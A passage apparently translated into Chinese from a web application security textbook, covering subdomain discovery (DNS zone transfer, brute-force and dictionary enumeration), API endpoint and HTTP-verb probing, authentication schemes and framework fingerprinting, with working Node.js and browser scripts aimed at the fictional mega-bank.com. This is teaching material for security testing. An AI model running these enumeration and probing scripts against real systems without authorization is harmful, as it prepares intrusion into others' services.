简而言之，如果我们希望针对 MegaBank 尝试发起区域传送攻击，我们需要假装自己是一台 DNS 服务器，并请求获取 DNS 区域文件，就像我们需要它来更新我们自己的记录一样。我们需要首先找到与 `https://www.mega-bank.com` 关联的 DNS 服务器。在任何基于 Unix 的系统中，我们都可以在终端中非常轻松地做到这一点：

```bash
host -t mega-bank.com
```

命令 `host` 是一个 DNS 查找工具，您可以在大多数 Linux 发行版以及最近版本的 macOS 中找到它。`-t` 标志指定我们想要请求负责解析 `mega-bank.com` 的名称服务器（Nameservers）。

此命令的输出类似于以下内容：

```text
mega-bank.com name server ns1.bankhost.com
mega-bank.com name server ns2.bankhost.com
```

我们在此结果中感兴趣的字符串是 `ns1.bankhost.com` 和 `ns2.bankhost.com`。这些指向解析 `mega-bank.com` 的两个名称服务器。

尝试使用 `host` 发起区域传送请求非常简单，应该只需要一行命令：

```bash
host -l mega-bank.com ns1.bankhost.com
```

这里的 `-l` 标志表明我们希望从 `ns1.bankhost.com` 获取 `mega-bank.com` 的区域传送文件，以便更新我们的记录。如果请求成功（表明 DNS 服务器安全配置不当），您将看到如下结果：

```text
Using domain server:
Name: ns1.bankhost.com
Address: 195.11.100.25
Aliases:

mega-bank.com has address 195.250.100.195
mega-bank.com name server ns1.bankhost.com
mega-bank.com name server ns2.bankhost.com
mail.mega-bank.com has address 82.31.105.140
admin.mega-bank.com has address 32.45.105.144
internal.mega-bank.com has address 25.44.105.144
```

从这些结果中，您现在获得了托管在 `mega-bank.com` 域名下的其他 Web 应用程序列表，以及它们的公网 IP 地址！

您甚至可以尝试导航到这些子域名或 IP 地址以查看解析出什么内容。运气好的话，您已经大大拓宽了攻击面！

不幸的是，DNS 区域传送攻击并不总是像前面的示例中那样按计划进行。配置得当的服务器在您请求区域传送时会给出不同的输出：

```text
Using domain server:
Name: ns1.secure-bank.com
Address: 141.122.34.45
Aliases:

; Transfer Failed.
```

区域传送攻击很容易防范，您会发现许多应用程序都已正确配置为拒绝这些尝试。然而，因为尝试一次区域传送攻击只需要几行 Bash 命令，所以它几乎总是值得一试。如果成功，您会获得许多其他方式可能无法找到的、有趣的子域名。

---

### 子域名暴力破解

作为发现子域名的最后手段，可以使用暴力破解（Brute Force）策略。这些策略在面对安全防护较少的 Web 应用程序时可能非常有效；然而，在面对更成熟、更安全的 Web 应用程序时，我们会发现暴力破解必须设计得非常聪明。子域名暴力破解应该是我们的最后底线，因为暴力破解尝试很容易被记录到日志中，并且由于速率限制（Rate Limitations）、正则表达式（Regex）以及为防止此类窥探而开发的其他简单安全机制，通常极为耗时。

> 警告：
> 暴力破解攻击非常容易被检测到，并可能导致您的 IP 地址被服务器或其管理员记录或封禁。

暴力破解意味着测试子域名的每一种可能组合，直到找到匹配项。对于子域名，可能存在许多匹配项，因此仅在找到第一个匹配项时停止可能是不够的。

首先，让我们停下来思考一下，与本地暴力破解不同，针对目标域名的子域名暴力破解需要网络连接。因为我们必须远程执行此暴力破解，网络延迟会进一步减慢我们的尝试速度。一般而言，每个网络请求可能存在 50 到 250 毫秒的延迟。

这意味着我们应该使请求异步（Asynchronous）化，并尽可能快地将它们全部发起，而不是等待前一个请求的响应。这样做将大大缩短我们完成暴力破解所需的时间。

检测一个活跃子域名所需的反馈闭环非常简单。我们的暴力破解算法生成一个子域名，然后向 `<subdomain-guess>.mega-bank.com` 发起请求。如果我们收到响应，我们将其标记为活跃子域名。否则，我们将其标记为未使用的子域名。

因为您正在阅读的这本书名为《Web Application Security》，所以在这种背景下，我们最需要熟悉的语言是 JavaScript。JavaScript 不仅是目前 Web 浏览器中唯一可用于客户端脚本的编程语言，而且得益于 Node.js 和开源社区，它也是一种功能极其强大的后端服务器端语言。

让我们使用 JavaScript 分两步构建一个暴力破解算法。我们的脚本应该执行以下操作：

1. 生成潜在子域名的列表。
2. 运行该子域名列表，每次进行 Ping 操作以检测子域名是否活跃。
3. 记录活跃的子域名，对未使用的子域名不执行任何操作。

我们可以使用以下代码生成子域名：

```javascript
/*
 * A simple function for brute forcing a list of subdomains
 * given a maximum length of each subdomain.
 */
const generateSubdomains = function(length) {

 /*
 * A list of characters from which to generate subdomains.
 *
 * This can be altered to include less common characters
 * like '-'.
 *
 * Chinese, Arabic, and Latin characters are also
 * supported by some browsers.
 */
 const charset = 'abcdefghijklmnopqrstuvwxyz'.split('');
 let subdomains = charset;
 let subdomain;
 let letter;
 let temp;

 /*
 * Time Complexity: o(n*m)
 * n = length of string
 * m = number of valid characters
 */
 for (let i = 1; i < length; i++) {
 temp = [];
 for (let k = 0; k < subdomains.length; k++) {
 subdomain = subdomains[k];
 for (let m = 0; m < charset.length; m++) {
 letter = charset[m];
 temp.push(subdomain + letter);
 }
 }
 subdomains = temp
 }

 return subdomains;
}

const subdomains = generateSubdomains(4);
```

此脚本将生成长度为 $n$ 的字符的每种可能组合，其中用于组合子域名的字符列表是 `charset`。该算法的工作原理是将 `charset` 字符串拆分为字符数组，然后将初始字符集分配给该字符数组。

接下来，我们根据持续长度进行迭代，在每次迭代时创建一个临时存储数组。然后，我们对每个子域名和指定了我们可用字符集的 `charset` 数组中的每个字符进行迭代。最后，我们使用现有子域名和字母的组合来构建 `temp` 数组。

现在，利用这个子域名列表，我们可以开始对像 `mega-bank.com` 这样的顶级域名（`.com`、`.org`、`.net` 等）进行查询。为了做到这一点，我们将编写一个简短的脚本，利用 Node.js（一种流行的 JavaScript 运行时）中提供的 DNS 库。

要运行此脚本，您只需要在您的环境中安装较新版本的 Node.js（前提是它是基于 Unix 的环境，如 Linux 或 Ubuntu）：

```javascript
const dns = require('dns');
const promises = [];

/*
 * This list can be filled with the previous brute force
 * script, or use a dictionary of common subdomains.
 */
const subdomains = [];

/*
 * Iterate through each subdomain, and perform an asynchronous
 * DNS query against each subdomain.
 *
 * This is much more performant than the more common `dns.lookup()`
 * because `dns.lookup()` appears asynchronous from the JavaScript,
 * but relies on the operating system's getaddrinfo(3) which is
 * implemented synchronously.
 */
subdomains.forEach((subdomain) => {
 promises.push(new Promise((resolve, reject) => {
 dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
 return resolve({ subdomain: subdomain, ip: ip });
 });
 }));
});

// after all of the DNS queries have completed, log the results
Promise.all(promises).then(function(results) {
 results.forEach((result) => {
 if (!!result.ip) {
 console.log(result);
 }
 });
});
```

在此脚本中，我们做了几件事来提高暴力破解代码的清晰度和性能。首先导入 Node DNS 库。然后我们创建一个 `promises` 数组，它将存储一个 Promise 对象列表。Promises 是在 JavaScript 中处理异步请求的一种简单得多的方式，并且在每个主流 Web 浏览器和 Node.js 中都得到了原生支持。

在此之后，我们创建另一个名为 `subdomains` 的数组，其中应该填充我们从第一个脚本生成的子域名（我们将在本节末尾将这两个脚本合并在一起）。接下来，我们使用 `forEach()` 运算符轻松迭代 `subdomains` 数组中的每个子域名。这等同于 `for` 迭代，但在语法上更优雅。

在子域名迭代的每个层级，我们将一个新的 Promise 对象推送到 `promises` 数组中。在此 Promise 对象中，我们调用了 `dns.resolve`，这是 Node.js DNS 库中的一个函数，用于尝试将域名解析为 IP 地址。我们推送到 Promise 数组的这些 Promises 仅在 DNS 库完成其网络请求后才会解析。

最后，`Promise.all` 块接收一个 Promise 对象和结果数组，并且仅在数组中的每个 Promise 都已解析（完成其网络请求）时才进行调用（调用 `.then()`）。结果中的双感叹号 `!!` 运算符指定我们只想要返回已定义的结果，因此我们应该忽略不返回 IP 地址的尝试。

如果我们包含了一个调用 `reject()` 的条件，我们还需要在末尾添加一个 `catch()` 块来处理错误。DNS 库会抛出许多错误，其中一些可能不值得为此中断我们的暴力破解。为了简单起见，本例中省略了这一点，但如果您打算进一步拓展本例，这将是一个很好的练习。

此外，我们使用的是 `dns.resolve` 而不是 `dns.lookup`，因为尽管两者的 JavaScript 实现都以异步方式解析（无论它们被触发的顺序如何），但 `dns.lookup` 依赖的原生实现是构建在 `libuv` 上的，而 `libuv` 是同步执行这些操作的。

我们可以很容易地将这两个脚本合并为一个程序。首先，我们生成潜在子域名的列表，然后执行解析子域名的异步暴力破解尝试：

```javascript
const dns = require('dns');

/*
 * A simple function for brute forcing a list of subdomains
 * given a maximum length of each subdomain.
 */
const generateSubdomains = function(length) {

 /*
 * A list of characters from which to generate subdomains.
 *
 * This can be altered to include less common characters
 * like '-'.
 *
 * Chinese, Arabic, and Latin characters are also
 * supported by some browsers.
 */
 const charset = 'abcdefghijklmnopqrstuvwxyz'.split('');
 let subdomains = charset;
 let subdomain;
 let letter;
 let temp;

 /*
 * Time Complexity: o(n*m)
 * n = length of string
 * m = number of valid characters
 */
 for (let i = 1; i < length; i++) {
 temp = [];
 for (let k = 0; k < subdomains.length; k++) {
 subdomain = subdomains[k];
 for (let m = 0; m < charset.length; m++) {
 letter = charset[m];
 temp.push(subdomain + letter);
 }
 }
 subdomains = temp
 }

 return subdomains;
}

const subdomains = generateSubdomains(4);
const promises = [];

/*
 * Iterate through each subdomain, and perform an asynchronous
 * DNS query against each subdomain.
 *
 * This is much more performant than the more common `dns.lookup()`
 * because `dns.lookup()` appears asynchronous from the JavaScript,
 * but relies on the operating system's getaddrinfo(3), which is
 * implemented synchronously.
 */
subdomains.forEach((subdomain) => {
 promises.push(new Promise((resolve, reject) => {
 dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
 return resolve({ subdomain: subdomain, ip: ip });
 });
 }));
});

// after all of the DNS queries have completed, log the results
Promise.all(promises).then(function(results) {
 results.forEach((result) => {
 if (!!result.ip) {
 console.log(result);
 }
 });
});
```

经过短暂的等待，我们将在终端中看到有效子域名的列表：

```text
{ subdomain: 'mail', ip: '12.32.244.156' },
{ subdomain: 'admin', ip: '123.42.12.222' },
{ subdomain: 'dev', ip: '12.21.240.117' },
{ subdomain: 'test', ip: '14.34.27.119' },
{ subdomain: 'www', ip: '12.14.220.224' },
{ subdomain: 'shop', ip: '128.127.244.11' },
{ subdomain: 'ftp', ip: '12.31.222.212' },
{ subdomain: 'forum', ip: '14.15.78.136' }
```

---

### 字典攻击

与其尝试每一个可能的子域名组合，我们可以通过利用字典攻击（Dictionary Attack）来进一步加快该过程。与暴力破解攻击非常相似，字典攻击也会循环遍历各种潜在子域名，但它们不是随机生成的，而是从最常见的子域名列表中提取的。

字典攻击要快得多，并且通常会为您找到一些感兴趣的内容。只有最奇特和非标准的子域名才会在字典攻击中隐匿。

一个名为 `dnscan` 的常用开源 DNS 扫描器附带了一个包含互联网上最热门子域名的列表，该列表基于来自超过 86,000 个 DNS 区域记录的数百万个子域名。根据来自 `dnscan` 的子域名扫描数据，前 25 个最常见的子域名如下：

* `www`
* `mail`
* `ftp`
* `localhost`
* `webmail`
* `smtp`
* `pop`
* `ns1`
* `webdisk`
* `ns2`
* `cpanel`
* `whm`
* `autodiscover`
* `autoconfig`
* `m`
* `imap`
* `test`
* `ns`
* `blog`
* `pop3`
* `dev`
* `www2`
* `admin`
* `forum`
* `news`

GitHub 上的 `dnscan` 仓库托管了包含前 10,000 个子域名的文件，得益于其非常开放的 GNU v3 许可证，这些文件可以整合到您的侦察过程中。您可以在 GitHub 上找到 `dnscan` 的子域名列表和源代码。

我们可以轻松地将类似 `dnscan` 的字典插入到我们的脚本中。对于较小的列表，您可以简单地将字符串复制/粘贴/硬编码到脚本中。对于大型列表，例如 `dnscan` 的 10,000 个子域名列表，我们应该将数据与脚本分开，并在运行时将其拉入。这将使修改子域名列表或使用其他子域名列表变得更加容易。这些列表中的大多数都将采用 `.csv` 格式，这使得将其集成到您的子域名侦察脚本中变得非常简单：

```javascript
const dns = require('dns');
const csv = require('csv-parser');
const fs = require('fs');

const promises = [];

/*
 * Begin streaming the subdomain data from disk (versus
 * pulling it all into memory at once, in case it is a large file).
 *
 * On each line, call `dns.resolve` to query the subdomain and
 * check if it exists. Store these promises in the `promises` array.
 *
 * When all lines have been read, and all promises have been resolved,
 * then log the subdomains found to the console.
 *
 * Performance Upgrade: if the subdomains list is exceptionally large,
 * then a second file should be opened and the results should be
 * streamed to that file whenever a promise resolves.
 */
fs.createReadStream('subdomains-10000.txt')
 .pipe(csv())
 .on('data', (subdomain) => {
 promises.push(new Promise((resolve, reject) => {
 dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
 return resolve({ subdomain: subdomain, ip: ip });
 });
 }));
 })
 .on('end', () => {
 // after all of the DNS queries have completed, log the results
 Promise.all(promises).then(function(results) {
 results.forEach((result) => {
 if (!!result.ip) {
 console.log(result);
 }
 });
 });
 });
```

是的，就是这么简单！如果您能找到一个可靠的子域名精选字典（只需简单搜索即可），您就可以将其粘贴到暴力破解脚本中，现在您就拥有了一个可以使用的字典攻击脚本。因为字典方法比纯暴力破解方法高效得多，所以先从字典开始，然后仅在字典未返回您正在寻找的结果时才使用暴力破解生成子域名，这才是明智之举。

---

### 本章小结

在对 Web 应用程序进行侦察时，主要目标应该是构建一张应用程序的资产图，以便稍后在确定攻击负载的优先级和部署时使用。此搜索的首要组成部分是了解哪些服务器负责维持应用程序的运行——因此我们需要搜索与应用程序主域名相关联的子域名。

面向消费者的域名（例如银行网站的客户端）通常受到的审查最多。由于访问者每天都会接触到这些漏洞，因此漏洞会得到迅速修复。

在幕后运行的服务器（如邮件服务器或管理员后门）通常充斥着 Bug，因为它们的使用和接触面要少得多。通常，在寻找可利用的漏洞时，找到这些“幕后” API 之一会是一个非常有益的突破口。

在尝试寻找子域名时应该使用多种技术，因为单一的技术可能无法提供全面的结果。一旦您确信自己已经执行了足够的侦察并收集了您正在测试的域名的几个子域名，您就可以继续使用其他侦察技术——但如果您在更明显的攻击向量上运气不佳，随时欢迎您回来寻找更多子域名。

---

## 第 5 章 API 分析

API（应用程序接口，Application Programming Interface）端点分析是子域名发现（Subdomain Discovery）之后，侦察（Reconnaissance，Recon）工具箱中下一个顺理成章的技能。该应用程序使用了哪些域名？如果该应用程序具有三个域名（例如 `x.domain`、`y.domain` 和 `z.domain`），我应该意识到它们中的每一个都可能拥有自己独特的 API 端点。

一般来说，我们可以使用与尝试寻找子域名时非常相似的技术。暴力破解（Brute Force）攻击和字典攻击（Dictionary Attack）在这里效果很好，但手动尝试和逻辑分析也往往会带来回报。

在发现子域名之后，寻找 API 是了解 Web 应用程序结构的第二步。这一步将为我们提供开始理解暴露的 API 的用途所需的信息。当我们理解了为什么一个 API 会暴露在网络上时，我们就可以开始了解它是如何融入应用程序的，以及它的业务目的是什么。

### 端点发现

此前我们讨论过，如今大多数企业级应用程序在定义其 API 结构时都会遵循特定的方案。通常，API 会遵循表述性状态传递（Representational State Transfer，REST）格式或简单对象访问协议（Simple Object Access Protocol，SOAP）格式。REST 正在变得流行得多，并被认为是如今现代 Web 应用程序 API 的理想结构。

当我们浏览应用程序并分析网络请求时，可以利用浏览器中的开发者工具。如果我们看到许多类似于以下内容的 HTTP 请求，那么几乎可以安全地假设这是一个 REST API：

```
GET api.mega-bank.com/users/1234
GET api.mega-bank.com/users/1234/payments
POST api.mega-bank.com/users/1234/payments
```

请注意，每个端点都指定了一个特定的资源，而不是一个函数。此外，我们可以假设嵌套资源 `payments` 属于用户 `1234`，这告诉我们该 API 是分层级的。这是 RESTful 设计的另一个明显迹象。

如果我们查看每个请求发送的 Cookie，并查看每个请求的头部（Header），我们可能还会发现 RESTful 架构的迹象：

```http
POST /users/1234/payments HTTP/1.1
Host: api.mega-bank.com
Authorization: Bearer abc21323
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/1.0 (KHTML, like Gecko)
```

随每个请求发送令牌（Token）是 RESTful API 设计的另一个迹象。REST API 应该是无状态的（Stateless），这意味着服务器不应该记录其请求者的状态。

一旦我们知道这确实是一个 REST API，我们就可以开始对可用的端点做出逻辑假设。表 5-1 列出了 REST 架构支持的 HTTP 动词（HTTP Verbs）。利用表 5-1，我们可以查看在浏览器控制台中找到的针对特定资源的请求，并尝试使用不同的 HTTP 动词向这些资源发起请求，以查看 API 是否返回了任何有趣的内容。

**表 5-1. REST 架构支持的 HTTP 动词**

| REST HTTP 动词 | 用途      |
| :------------- | --------- |
| POST           | 创建      |
| GET            | 读取      |
| PUT            | 更新/替换 |
| PATCH          | 更新/修改 |
| DELETE         | 删除      |

HTTP 规范定义了一种特殊方法，其唯一目的是提供有关特定 API 动词的信息。该方法被称为 `OPTIONS`，在我们对 API 进行侦察时，它应该是我们的首选方法。我们可以在终端中轻松使用 `curl` 发起请求：

```bash
curl -i -X OPTIONS https://api.mega-bank.com/users/1234
```

如果 `OPTIONS` 请求成功，我们应该会看到如下响应：

```http
200 OK
Allow: HEAD, GET, PUT, DELETE, OPTIONS
```

一般来说，`OPTIONS` 仅在专门指定用于公共用途的 API 上可用。因此，虽然这是一个简单的首次尝试，但对于我们尝试测试的大多数应用程序，我们需要一个更强大的发现解决方案。极少数企业级应用程序会暴露 `OPTIONS`。

让我们转向一种更有可能确定所接受的 HTTP 动词的方法。我们在浏览器中看到的第一个 API 调用如下：

```
GET api.mega-bank.com/users/1234
```

我们现在可以将其扩展为：

```
GET api.mega-bank.com/users/1234
POST api.mega-bank.com/users/1234
PUT api.mega-bank.com/users/1234
PATCH api.mega-bank.com/users/1234
DELETE api.mega-bank.com/users/1234
```

记住前述的 HTTP 动词列表，我们可以生成一个脚本来测试我们理论的合理性。

> ⚠️ **警告**
>
> 暴力破解 API 端点的 HTTP 动词可能会带来删除或更改应用程序数据的副作用。在针对应用程序 API 进行任何类型的暴力破解尝试之前，请确保您已获得应用程序所有者的明确许可。

我们的脚本目的很简单：使用一个给定的端点（我们知道该端点已经至少接受一个 HTTP 动词），尝试每个其他的 HTTP 动词。在针对该端点尝试了每个其他的 HTTP 动词之后，记录并打印结果：

```javascript
/*
 * 给定一个 URL（对应一个 API 端点），
 * 尝试使用各种 HTTP 动词发送请求，以确定
 * 哪些 HTTP 动词映射到了给定的端点。
 */
const discoverHTTPVerbs = function(url) {
const verbs = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE'];
const promises = [];

verbs.forEach((verb) => {
 const promise = new Promise((resolve, reject) => {
  const http = new XMLHttpRequest();
  http.open(verb, url, true);
  http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  /*
   * 如果请求成功，解决（resolve）该 Promise 并
   * 在结果中包含状态码。
   */
  http.onreadystatechange = function() {
   if (http.readyState === 4) {
    return resolve({ verb: verb, status: http.status });
   }
  }

  /*
   * 如果请求不成功，或未在规定时间内完成，将
   * 该请求标记为不成功。应根据
   * 平均响应时间来微调超时时间（timeout）。
   */
  setTimeout(() => {
   return resolve({ verb: verb, status: -1 });
  }, 1000);

  // 发起 HTTP 请求
  http.send({});
 });

 // 将 Promise 对象添加到 promises 数组中
 promises.push(promise);
});

/*
 * 当尝试了所有的动词，将它们
 * 各自的 Promise 结果记录到控制台。
 */
Promise.all(promises).then(function(values) {
 console.log(values);
});
}
```

该脚本在技术层面的运作方式同样简单。HTTP 端点会返回一个状态码，以及任何它们发回浏览器的消息。我们实际上并不关心这个状态码是什么。我们只是想看到一个状态码。

我们针对 API 发起若干个 HTTP 请求，每个 HTTP 动词一个。大多数服务器不会对未映射到有效端点的请求做出响应，因此我们增加了一个额外的处理情况：如果请求在 1 秒内未收到响应，我们将其返回 `-1`。一般来说，1 秒（在此例中为 1,000 毫秒）对于 API 的响应来说已经足够充裕。您可以根据自己的具体用例将其调大或调小。

在所有 Promise 都解决之后，您可以查看日志输出，以确定哪些 HTTP 动词具有相关联的端点。

### 身份验证机制

猜测 API 端点所需的有效载荷（Payload）结构，要比仅断言 API 端点存在困难得多。最简单的方法是分析通过浏览器发送的已知请求的结构。除此之外，我们必须对 API 端点所需的结构进行合理的猜测，并手动进行测试。自动发现 API 端点的结构是可行的，但任何不涉及分析现有请求的自动尝试都会非常容易被检测并记录。

通常，最好从几乎每个应用程序中都能找到的常见端点开始：登录（Sign In）、注册（Sign Up）、密码重置（Password Reset）等。这些端点通常会接收与其它应用程序类似结构的有效载荷（Payload），因为身份验证通常是基于标准化方案设计的。

每个应用程序与公共 Web 用户界面应该有一个登录页面。然而，它们对您的会话（Session）进行身份验证的方式可能会有所不同。了解您正在使用的身份验证方案类型非常重要，因为许多现代应用程序会在每个请求中发送身份验证令牌。这意味着，如果我们能够逆向工程所使用的身份验证类型，并理解令牌是如何附加到请求中的，那么分析其他依赖已验证用户令牌的 API 端点就会变得更加容易。目前有几种主要的身份验证方案正在使用，其中最常见的如表 5-2 所示。

**表 5-2. 主要身份验证方案**

| 身份验证方案                                | 实现细节                                                     | 优势                                             | 劣势                                                         |
| :------------------------------------------ | :----------------------------------------------------------- | :----------------------------------------------- | :----------------------------------------------------------- |
| HTTP 基本认证（HTTP Basic Auth）            | 每个请求中都会发送用户名和密码。                             | 所有主流浏览器都原生支持此方案。                 | 会话永不过期；极易被拦截。                                   |
| HTTP 摘要认证（HTTP Digest Authentication） | 每个请求中发送哈希后的 `username:realm:password`。           | 更难被拦截；服务器可以拒绝过期的令牌。           | 加密强度取决于所使用的哈希算法。                             |
| 开放授权（OAuth）                           | 基于“Bearer”令牌的认证；允许使用其他网站（如 Amazon -> Twitch）登录。 | 令牌化的权限可以在应用程序之间共享，以便于集成。 | 存在钓鱼风险；中心化站点一旦遭到入侵，所有关联的应用程序都会受影响。 |

如果我们登录到 `https://www.mega-bank.com` 并分析网络响应，在登录成功后我们可能会看到类似以下的内容：

```http
GET /homepage
HOST mega-bank.com
Authorization: Basic am9lOjEyMzQ=
Content-Type: application/json
```

我们一眼就能看出这是 HTTP 基本认证，因为发送了 `Basic` 授权头部。此外，字符串 `am9lOjEyMzQ=` 仅仅是一个经 Base64 编码的 `用户名:密码` 字符串。这是在 HTTP 上传输用户名和密码组合的最常见格式。

在浏览器控制台中，我们可以使用内置函数 `btoa(str)` 和 `atob(base64)` 将字符串转换为 Base64，反之亦然。如果我们通过 `atob` 函数运行该 Base64 编码的字符串，我们将看到在网络上传输的用户名和密码：

```javascript
/*
 * 解码之前用 base64 编码的字符串。
 * 结果 = joe:1234
 */
atob('am9lOjEyMzQ=');
```

由于这种机制非常不安全，基本认证通常仅用于强制执行 SSL/TLS 流量加密的 Web 应用程序上。通过这种方式，凭据（Credential）就不会在半空中被拦截——例如，在不安全的商场 WiFi 热点处。

从这次登录/重定向到主页的分析中，需要注意的重要一点是，我们的请求确实已被验证，并且它们是通过 `Authorization: Basic am9lOjEyMzQ=` 进行验证的。这意味着，如果我们遇到另一个在空有效载荷下不返回任何有趣内容的端点，我们首先应该尝试附加一个授权头部，并看看当我们作为已验证用户进行请求时，它是否会产生不同的结果。

### 端点结构

在定位了若干个子域名以及这些子域名中包含的 HTTP API 之后，开始确定每个资源所使用的 HTTP 动词，并将该调查结果添加到您的 Web 应用程序地图中。一旦您拥有了子域名、API 和结构的完整列表，您可能会开始思考如何才能真正了解任何给定的 API 所期望的有效载荷类型。

#### 常见结构

有时这个过程非常简单——许多 API 期望的有效载荷结构在行业中是通用的。例如，作为 OAuth 2.0 流程一部分而建立的授权端点可能期望以下数据：

```json
{
 "response_type": "code",
 "client_id": "id",
 "scope": ["scopes"],
 "state": "state",
 "redirect_uri": "uri"
}
```

由于 OAuth 2.0 是一个被广泛实现的公共规范，因此要确定在 OAuth 2.0 授权端点中包含哪些数据，通常可以通过合理的猜测并结合可用的公共文档来完成。OAuth 2.0 授权端点中的命名约定和范围列表在不同的实现中可能会略有不同，但整体的有效载荷结构不应有太大差异。

在 Discord（即时通讯）的公共文档中可以找到一个 OAuth 2.0 授权端点的例子。Discord 建议对 OAuth 2.0 端点的调用应结构化如下：

```
https://discordapp.com/api/oauth2/authorize?response_type=code&client_\
id=157730590492196864&scope=identify%20guilds.\
join&state=15773059ghq9183habn&redirect_uri=https%3A%2F%2Fnicememe.\
website&prompt=consent
```

在这里，`response_type`、`client_id`、`scope`、`state` 和 `redirect_uri` 都是官方规范的一部分。

Facebook 的 OAuth 2.0 公共文档也非常相似，建议针对相同的功能发起以下请求：

```
GET https://graph.facebook.com/v4.0/oauth/access_token?
 client_id={app-id}
 &redirect_uri={redirect-uri}
 &client_secret={app-secret}
 &code={code-parameter}
```

因此，在处理常见的端点原型时，寻找 HTTP API 的结构并不复杂。然而，明智的做法是考虑到，虽然许多 API 实现了像 OAuth 这样的通用规范，但对于负责启动应用程序逻辑的内部 API，它们通常不会使用通用规范。

#### 应用程序特定结构

与基于公共规范的结构相比，应用程序特定结构（Application-Specific Shapes）要难确定得多。为了确定 API 端点所期望的有效载荷结构，您可能需要依赖许多侦察技术，并通过反复试验慢慢了解该端点。

安全性较差的应用程序可能会以 HTTP 错误消息的形式为您提供提示。例如，假设您使用以下主体调用 `POST https://www.mega-bank.com/users/config`：

```json
{
"user_id": 12345,
"privacy": {
 "publicProfile": true
}
}
```

您可能会收到一个类似于 `401 not authorized` 或 `400 internal error` 的 HTTP 状态码。如果状态码伴随有类似 `auth_token not supplied` 的消息，您可能意外发现了一个缺失的参数。

在带有正确 `auth_token` 的另一个请求中，您可能会收到另一个错误消息：`publicProfile only accepts "auth" and "noAuth" as params`。

但安全性更高的应用程序可能只会抛出一个通用的错误，您将不得不转向其他技术。

如果您拥有一个特权账户，您可以在尝试对另一个账户发起请求之前，先使用 UI 对您自己的账户尝试相同的请求，以确定发出的数据结构是什么样的。这可以在浏览器的开发者工具 -> 网络（Network）选项卡中找到，或者使用像 Burp 这样的网络监控工具。

最后，如果您知道有效载荷中所期望的变量名称，但不知道其值，那么您也许能够通过使用不同的变量值重复请求来进行暴力破解，直到其中一个成功。显然，手动暴力破解数值非常缓慢，因此您需要一个脚本来加速这个过程。您能了解到的关于期望变量的规则越多越好。如果您知道 `auth_token` 始终是 12 个字符，那就太好了。如果您知道它始终是十六进制的，那就更好了。您能学习并应用的规则越多，就越有可能通过暴力破解成功匹配出正确的组合。

一个字段所有可能组合的列表被称为解空间（Solutions Space）。您希望将解空间减少到最小的可行搜索空间。

与其寻找有效的解，您可能还想尝试寻找无效的解。这些可能有助于您缩小解空间，甚至可能发现应用程序代码中的漏洞。

### 本章小结

在对驱动应用程序的子域名建立心智模型（理想情况下也应以某种形式记录下来）之后，下一步就是寻找托管在这些子域名上的 API 端点，以便稍后尝试确定它们的用途。虽然这听起来像是一个简单的步骤，但作为一种侦察技术，它是至关重要的。因为如果没有它，您可能会花时间试图在防护严密的端点中寻找漏洞，而与此同时，存在具有类似功能或数据的、安全性较低的端点。此外，如果您还不清楚 API 的预期用途，在 API 上寻找端点是理解该 API 用途和功能的重要一步。

一旦您发现并记录了许多 API 端点，那么确定该端点所接收的有效载荷结构就是下一个顺理成章的步骤。结合合理的猜测、自动化以及对常见端点原型的分析（正如我们在本章中所做的那样），最终将引导您发现这些端点所期望的数据以及作为响应发送的数据。记住这些知识，您现在就理解了应用程序的功能，这是攻攻破或保护应用程序的第一个重要步骤。

---

## 第 6 章 识别第三方依赖

如今，大多数 Web 应用程序都是基于内部开发代码和通过多种集成技术之一内部集成的外部代码的组合而构建的。外部依赖可以是来自另一家公司的专有代码（允许在特定的许可模式下进行集成），也可以是免费的（通常来自开源软件（Open Source Software，OSS）社区）。在应用程序代码中使用此类第三方依赖并不是没有风险的，而且第三方依赖通常不会像内部开发代码那样受到如此严格的安全审查。

在侦察期间，您可能会遇到许多第三方集成，您需要对依赖项和集成方法都给予高度关注。这些依赖项往往会转化为攻击向量；有时此类依赖项中的漏洞是众所周知的，您甚至可能不需要自己准备攻击，而是能够从通用漏洞披露（Common Vulnerabilities and Exposures，CVE）数据库中复制现成的攻击。

### 检测客户端框架

通常，开发人员不会去构建复杂的 UI 基础设施，而是利用维护良好且经过充分测试的 UI 框架。这些框架通常以用于处理复杂状态的单页面应用（Single-Page Application，SPA）库、用于修补跨浏览器 JavaScript 语言功能漏洞的纯 JS 框架（如 Lodash、JQuery），或用于改善网站视觉外观和体验的 CSS 框架（如 Bootstrap、Bulma）等形式出现。

通常，这三种框架都很容易检测。如果您能确定版本号，您通常可以在网上找到适用的 ReDoS、原型链污染（Prototype Pollution）和 XSS 漏洞的组合（特别是在未更新的旧版本中）。

#### 检测 SPA 框架

截至 2023 年，Web 上最大的 SPA 框架包括（排名不分先后）：

*   EmberJS (LinkedIn, Netflix)
*   Angular (Google)
*   React (Facebook)
*   VueJS (Adobe, GitLab)

这些框架中的每一个都引入了非常特殊的语法和顺序，规定了它们如何管理文档对象模型（Document Object Model，DOM）元素，以及开发人员如何与该框架进行交互。并非所有的框架都这么容易检测。有些需要使用指纹识别（Fingerprinting）或更先进的技术。当版本信息呈现给您时，请务必将其记录下来。

##### EmberJS

EmberJS 非常容易检测，因为当 EmberJS 引导启动时，它会设置一个全局变量 `Ember`，该变量在浏览器控制台中很容易被找到。

EmberJS 还会用 `ember-id` 标记所有 DOM 元素，以供其内部使用。这意味着，如果您通过开发者工具 -> 元素（Elements）选项卡查看任何使用 EmberJS 的给定网页中的 DOM 树，您应该会看到许多包含 `id=ember1`、`id=ember2`、`id=ember3` 等的 div。这些 div 中的每一个都应该被包裹在一个 `class="ember-application"` 父元素中，该父元素通常是 body 元素。

EmberJS 使得检测正在运行的版本变得非常容易。只需引用附加到全局 `Ember` 对象上的一个常量即可：

```javascript
// 3.1.0
console.log(Ember.VERSION);
```

##### Angular

较旧版本的 Angular 提供了类似于 EmberJS 的全局对象。该全局对象名为 `angular`，版本可以从其属性 `angular.version` 中获取。Angular 4.0+ 取消了这个全局对象，这使得确定 Angular 应用的版本变得稍微困难了一些。您可以通过在控制台中检查全局 `ng` 是否存在，来检测应用程序是否正在运行 Angular 4.0+。

要检测其版本，您需要做更多的工作。首先，获取 Angular 应用中的所有根元素。然后检查第一个根元素上的属性。第一个根元素应该有一个 `ng-version` 属性，它将为您提供您正在调查的应用程序的 Angular 版本：

